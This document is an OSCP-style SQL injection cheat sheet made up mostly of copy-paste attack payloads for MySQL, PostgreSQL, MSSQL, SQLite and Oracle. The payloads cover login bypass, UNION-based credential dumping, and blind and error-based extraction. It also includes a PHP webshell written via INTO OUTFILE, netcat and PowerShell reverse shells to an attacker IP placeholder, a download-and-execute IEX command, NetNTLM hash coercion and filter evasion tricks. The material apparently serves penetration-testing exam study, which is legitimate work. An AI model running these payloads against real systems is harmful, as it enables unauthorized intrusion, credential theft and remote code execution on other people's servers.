# SQL Injection (SQLi) - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Web Attack Methodology: [[02-Web-Attack|02 - Web Attack Methodology]]
> - Burp Suite Cheatsheet: [[🟠 BurpSuite]]
> - Active Directory Methodology: [[05-Active-Directory|05 - Active Directory Methodology]]
> - Password Attacks Methodology: [[09-Password-Attacks|09 - Password Attacks Methodology]]

---

## Navigation Triage Matrix

| Operational Goal | Technique / Category | Quick Link |
|---|---|---|
| Bypass login forms with boolean logic | Authentication Bypass | [[#1. Authentication Bypass (Login Forms)]] |
| Determine column count using ORDER BY or UNION | Column Count Identification | [[#2. Column Count Identification]] |
| Find which columns reflect text data on page | Reflective Column Mapping | [[#3. Reflective Column Mapping]] |
| Extract database, schema, and credentials in-band | UNION-Based Data Extraction | [[#4. In-Band UNION-Based Data Extraction]] |
| Trigger database errors that reflect query data | Error-Based SQL Injection | [[#5. Error-Based SQL Injection]] |
| Infer data character by character using true/false | Boolean-Based Blind SQLi | [[#6. Boolean-Based Blind SQL Injection]] |
| Extract data via time delays (SLEEP, WAITFOR) | Time-Based Blind SQLi | [[#7. Time-Based Blind SQL Injection]] |
| Read system files and write webshells to disk | SQLi to File Operations and RCE | [[#8. SQLi to File Operations and Remote Code Execution]] |
| Execute commands on MSSQL and steal NetNTLM hashes | MSSQL Specific Exploitation | [[#9. MSSQL Specific Exploitation (Active Directory)]] |
| Inject into SQLite applications | SQLite Injection | [[#10. SQLite Injection Techniques]] |
| Inject into Oracle databases | Oracle Injection | [[#11. Oracle Database Injection]] |
| Bypass filters, WAF rules, and quote restrictions | Filter Evasion and Obfuscation | [[#12. Filter Evasion and Obfuscation Techniques]] |
| Cross-DBMS syntax reference table | Cross-DBMS Comparison Matrix | [[#13. Cross-DBMS Syntax Comparison Matrix]] |
| Fast copy-paste injection one-liners | Quick Reference | [[#14. Quick Reference Cheat Sheet]] |

---

## 1. Authentication Bypass (Login Forms)

Authentication bypass vectors manipulate SQL boolean logic to evaluate queries as TRUE without requiring valid passwords.

### Standard Login Injection Payloads
Targeting the `Username` field:
```sql
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
admin' -- -
admin' #
admin'/*
' OR '1'='1
" OR "1"="1
admin' or '1'='1'-- -
```

### Comment Syntax by Database Engine
- **MySQL / MariaDB**: `-- -` (double hyphen followed by space and character) or `#`
- **PostgreSQL**: `--` or `/* comment */`
- **MSSQL**: `--` or `/* comment */`
- **SQLite**: `--` or `/* comment */`
- **Oracle**: `--`

---

## 2. Column Count Identification

Before launching `UNION SELECT` extraction, you must determine the exact number of columns returned by the original query:

### Technique 1: ORDER BY Incrementation
Increment the column index until an error occurs (or page goes blank):
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -    <-- Returns error: Exactly 3 columns exist in the query
```

### Technique 2: UNION SELECT NULL Probing
Use `NULL` values to avoid data type mismatch errors across strict databases (Oracle, PostgreSQL):
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -    <-- Returns normal response: 3 columns confirmed
```

---

## 3. Reflective Column Mapping

Once the column count is established, determine which columns reflect data directly onto the rendered webpage:

```sql
' UNION SELECT 1,2,3-- -
```
- Inspect the webpage source or rendered layout for the numbers `1`, `2`, or `3`.
- If `2` appears on the screen, replace `2` with data extraction queries while keeping `1` and `3` as dummy values.

---

## 4. In-Band UNION-Based Data Extraction

Replace the reflective column index (e.g., column 2) with your target extraction subquery:

### System Banner and Context Information
```sql
-- MySQL / MariaDB:
' UNION SELECT 1,CONCAT_WS(':', @@version, user(), database()),3-- -

-- PostgreSQL:
' UNION SELECT 1,version() || ' : ' || current_user || ' : ' || current_database(),3-- -

-- MSSQL:
' UNION SELECT 1,@@version + ' : ' + SYSTEM_USER + ' : ' + DB_NAME(),3--

-- SQLite:
' UNION SELECT 1,sqlite_version(),3-- -

-- Oracle (Requires FROM dual and NULL matching):
' UNION SELECT NULL,banner,NULL FROM v$version--
```

### Schema and Table Enumeration
```sql
-- MySQL:
' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- PostgreSQL:
' UNION SELECT 1,STRING_AGG(table_name, ','),3 FROM information_schema.tables WHERE table_schema=current_schema()-- -

-- MSSQL:
' UNION SELECT 1,STRING_AGG(table_name, ','),3 FROM information_schema.tables--

-- SQLite:
' UNION SELECT 1,GROUP_CONCAT(tbl_name),3 FROM sqlite_master WHERE type='table'-- -

-- Oracle:
' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner=SYS_CONTEXT('USERENV','SESSION_USER')--
```

### Column Enumeration
```sql
-- MySQL:
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- PostgreSQL:
' UNION SELECT 1,STRING_AGG(column_name, ','),3 FROM information_schema.columns WHERE table_name='users'-- -

-- MSSQL:
' UNION SELECT 1,STRING_AGG(column_name, ','),3 FROM information_schema.columns WHERE table_name='users'--

-- SQLite (Extract table creation statement):
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE tbl_name='users'-- -
```

### Credential and Sensitive Data Extraction
```sql
-- MySQL (Colon delimiter 0x3a):
' UNION SELECT 1,GROUP_CONCAT(username, 0x3a, password),3 FROM users-- -

-- PostgreSQL:
' UNION SELECT 1,STRING_AGG(username || ':' || password, ','),3 FROM users-- -

-- MSSQL:
' UNION SELECT 1,STRING_AGG(username + ':' + password, ','),3 FROM users--

-- SQLite:
' UNION SELECT 1,GROUP_CONCAT(username || ':' || password),3 FROM users-- -
```

---

## 5. Error-Based SQL Injection

Used when query output is not rendered on the page, but database syntax errors are reflected in the HTTP response:

### MySQL (EXTRACTVALUE and UPDATEXML)
Forces an XML parsing failure that leaks query output in the error message (limited to 32 characters per query):
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)-- -

-- Extracting data with substring offset:
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 1, 30)))-- -
```

### PostgreSQL (CAST Type Conversion)
Forces integer conversion errors on string results:
```sql
' AND 1=CAST((SELECT version()) AS int)-- -
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
```

### MSSQL (CONVERT and CAST)
Forces type conversion errors leaking sensitive values:
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--
```

---

## 6. Boolean-Based Blind SQL Injection

Used when the application displays no error messages and no reflective data, but responds with distinct content (HTTP 200 vs HTTP 500, or text changes) based on TRUE/FALSE conditions:

### Probing for Boolean Vulnerability
```sql
' AND 1=1-- -   <-- Returns standard page layout (TRUE)
' AND 1=2-- -   <-- Returns missing content, error, or redirected response (FALSE)
```

### Inferring Data Character by Character
```sql
-- MySQL: Check if first character of database name is 'a'
' AND SUBSTRING((SELECT database()),1,1)='a'-- -

-- PostgreSQL:
' AND SUBSTRING((SELECT current_database()),1,1)='a'-- -

-- MSSQL:
' AND SUBSTRING((SELECT DB_NAME()),1,1)='a'--

-- SQLite:
' AND SUBSTR((SELECT sqlite_version()),1,1)='3'-- -
```

### ASCII Code Binary Search Comparison
Faster character enumeration via greater-than/less-than operators:
```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 97-- -
```

---

## 7. Time-Based Blind SQL Injection

Used when the web application response is completely identical regardless of query logic. Execution delays confirm injection and extract data:

### Verification Probes
```sql
-- MySQL / MariaDB (Sleeps 5 seconds):
' AND SLEEP(5)-- -

-- PostgreSQL (Stacked query sleep):
'; SELECT pg_sleep(5)-- -

-- MSSQL (Stacked query wait):
'; WAITFOR DELAY '0:0:5'--

-- SQLite (Heavy computation loop):
' AND (SELECT count(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) a, (SELECT 1 UNION SELECT 2 UNION SELECT 3) b)-- -
```

### Data Inference via Conditional Delays
```sql
-- MySQL: If first character of password is 'a', sleep 5 seconds
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)-- -

-- PostgreSQL:
'; SELECT CASE WHEN (SUBSTRING((SELECT current_database()),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- MSSQL:
'; IF (SUBSTRING((SELECT DB_NAME()),1,1)='a') WAITFOR DELAY '0:0:5'--
```

---

## 8. SQLi to File Operations and Remote Code Execution

### MySQL File Operations (Requires FILE Privilege and known webroot)

#### Reading Files (Local File Disclosure)
```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3-- -
```

#### Writing PHP Webshell to Disk (INTO OUTFILE)
*Condition: `secure_file_priv` must be empty or permit the target path, and webroot must be writable.*
```sql
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```
*Access shell*: `http://[TARGET_IP]/shell.php?cmd=whoami`

### PostgreSQL Remote Code Execution (Requires Superuser Privileges)

#### Direct RCE via COPY TO PROGRAM (PostgreSQL >= 9.3)
```sql
'; COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [KALI_IP] 443 >/tmp/f';-- -
```

#### Staged RCE via Table Creation
```sql
'; CREATE TABLE cmd_exec(output text);
COPY cmd_exec FROM PROGRAM 'whoami > /tmp/out.txt';-- -
```

#### Reading Files in PostgreSQL
```sql
SELECT pg_read_file('/etc/passwd');
```

---

## 9. MSSQL Specific Exploitation (Active Directory)

MSSQL installations in Active Directory environments frequently permit stacked queries (`;`) and can be escalated to full SYSTEM shells or credential harvesting:

### Enabling xp_cmdshell for Remote Code Execution
Requires `sysadmin` (sa) privileges:
```sql
-- 1. Enable advanced configuration options
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--

-- 2. Enable xp_cmdshell extension
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- 3. Execute system command directly
'; EXEC xp_cmdshell 'whoami';--

-- 4. Execute PowerShell Reverse Shell
'; EXEC xp_cmdshell 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(\"[KALI_IP]\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';--
```

### NetNTLMv2 Hash Coercion (xp_dirtree and Responder)
If `xp_cmdshell` is disabled or permissions are unprivileged, coerce the MSSQL service account to authenticate against your Kali SMB listener:
```sql
'; EXEC master..xp_dirtree '\\[KALI_IP]\share', 1, 1;--
'; EXEC master..xp_fileexist '\\[KALI_IP]\share\test.txt';--
```
Capture NetNTLMv2 hash in Responder, then crack with Hashcat:
```bash
hashcat -m 5600 -a 0 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

## 10. SQLite Injection Techniques

SQLite stores each database as a self-contained local file. It does not contain an `information_schema` catalog; metadata is stored in `sqlite_master`:

### Identification and Version
```sql
' UNION SELECT 1,sqlite_version(),3-- -
```

### Enumerating Tables
```sql
' UNION SELECT 1,GROUP_CONCAT(tbl_name),3 FROM sqlite_master WHERE type='table'-- -
```

### Enumerating Column Definitions
Extract the complete `CREATE TABLE` DDL statement:
```sql
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE tbl_name='users'-- -
```

### Extracting User Credentials
```sql
' UNION SELECT 1,GROUP_CONCAT(username || ':' || password),3 FROM users-- -
```

### Stacked INSERT Queries
```sql
'; INSERT INTO users(username, password) VALUES('admin', 'password123');-- -
```

---

## 11. Oracle Database Injection

Oracle enforces strict data typing across `UNION` operations and requires a table name for every `SELECT` query (`FROM dual`):

### Identification and Version
```sql
' UNION SELECT NULL,banner,NULL FROM v$version--
' UNION SELECT NULL,(SELECT version FROM v$instance),NULL FROM dual--
```

### Current User and Privileges
```sql
' UNION SELECT NULL,user,NULL FROM dual--
' UNION SELECT NULL,SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM dual--
```

### Enumerating Tables and Columns
```sql
-- All accessible tables
' UNION SELECT NULL,table_name,NULL FROM all_tables--

-- Tables owned by current user
' UNION SELECT NULL,table_name,NULL FROM all_tables WHERE owner=user--

-- Columns for table USERS
' UNION SELECT NULL,column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

### Data Extraction
```sql
' UNION SELECT NULL,username || ':' || password,NULL FROM users--
```

---

## 12. Filter Evasion and Obfuscation Techniques

### Space Character Filtering
When spaces are filtered or stripped by the application:
```sql
-- Use SQL block comments:
'/**/UNION/**/SELECT/**/1,2,3-- -

-- Use tab or newline URL encoding:
'%09UNION%09SELECT%091,2,3--%20-
'%0aUNION%0aSELECT%0a1,2,3--%20-
```

### Single Quote Filtering
When single quotes are escaped or disallowed, convert strings to Hexadecimal literals:
```sql
-- Standard syntax:
SELECT * FROM users WHERE username = 'admin'

-- Hex-encoded string syntax:
SELECT * FROM users WHERE username = 0x61646d696e
```

### URL Parameter Comment Encoding
Ensure trailing comments are properly URL-encoded in GET requests:
- `-- -` -> `--%20-`
- `#` -> `%23`

### Keyword Blacklist Evasion
- Case alterations: `uNiOn SeLeCt`
- Stacked inline comments: `UNI/*comment*/ON SEL/*comment*/ECT`

---

## 13. Cross-DBMS Syntax Comparison Matrix

| Action | MySQL / MariaDB | PostgreSQL | MSSQL | SQLite | Oracle |
|---|---|---|---|---|---|
| **Version** | `@@version` | `version()` | `@@version` | `sqlite_version()` | `banner FROM v$version` |
| **Current User** | `user()` | `current_user` | `SYSTEM_USER` | *N/A* | `user FROM dual` |
| **Current DB** | `database()` | `current_database()` | `DB_NAME()` | *N/A (single file)* | `SYS_CONTEXT('USERENV','DB_NAME') FROM dual` |
| **List Databases** | `SELECT schema_name FROM information_schema.schemata` | `SELECT datname FROM pg_database` | `SELECT name FROM sys.databases` | *N/A* | `SELECT DISTINCT owner FROM all_tables` |
| **List Tables** | `SELECT table_name FROM information_schema.tables WHERE table_schema=database()` | `SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()` | `SELECT table_name FROM information_schema.tables` | `SELECT tbl_name FROM sqlite_master WHERE type='table'` | `SELECT table_name FROM all_tables` |
| **Read File** | `LOAD_FILE('/path')` | `pg_read_file('/path')` | `OPENROWSET(BULK '/path', SINGLE_CLOB)` | *Not supported* | `UTL_FILE.FOPEN()` |
| **Concatenation** | `CONCAT(a,b)` or `GROUP_CONCAT()` | `a \|\| b` or `STRING_AGG()` | `a + b` or `STRING_AGG()` | `a \|\| b` or `GROUP_CONCAT()` | `a \|\| b` or `LISTAGG()` |
| **Comments** | `-- -` or `#` | `--` | `--` | `--` | `--` |
| **Stacked Queries** | ❌ Rarely enabled | ✅ Supported | ✅ Supported | ✅ Supported | ❌ Rarely enabled |

---

## 14. Quick Reference Cheat Sheet

```sql
-- 1. Fast Auth Bypass
' OR 1=1-- -
admin'-- -

-- 2. Determine Columns
' ORDER BY 1-- -
' ORDER BY 5-- -

-- 3. MySQL UNION Extract
' UNION SELECT 1,CONCAT_WS(':', @@version, user(), database()),3-- -
' UNION SELECT 1,GROUP_CONCAT(username, 0x3a, password),3 FROM users-- -

-- 4. PostgreSQL RCE
'; COPY (SELECT '') TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [KALI_IP] 443 >/tmp/f';-- -

-- 5. MSSQL Enable xp_cmdshell & RCE
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://[KALI_IP]/shell.ps1'')"';--

-- 6. MSSQL NetNTLMv2 Coercion to Responder
'; EXEC master..xp_dirtree '\\[KALI_IP]\share', 1, 1;--

-- 7. SQLite Extract DDL
' UNION SELECT 1,sql,3 FROM sqlite_master WHERE tbl_name='users'-- -
```
